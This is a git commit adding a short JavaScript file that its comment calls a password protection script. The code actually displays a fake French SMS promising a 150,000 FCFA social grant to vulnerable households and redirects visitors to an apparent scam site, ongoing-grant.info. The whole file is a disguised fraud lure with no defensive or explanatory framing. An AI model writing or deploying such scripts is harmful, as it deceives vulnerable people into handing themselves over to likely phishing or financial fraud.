86bb4ea331ae0323430b45be6d2eac6bf8ac20b4
The-On-going <sirpeelawson@gmail.com>
2026-02-10 03:07:10 +0100

    Create actived.js

---
+++ actived.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRER DE L’ARGENT'
+password = prompt(
+  'SMS: Félicitations ! Vous êtes éligible pour recevoir une Subvention de Transfert Social en Espèces de 150 000 FCFA 2026 destinée aux ménages vulnérables. Veuillez cliquer sur OK pour la recevoir immédiatement.',
+  'RETIRER DE L’ARGENT'
+);
+if (password != 'RETIRER DE L’ARGENT') {
+  location.href = 'https://ongoing-grant.info/Sct-Subvention-Sociale.html';
+  }
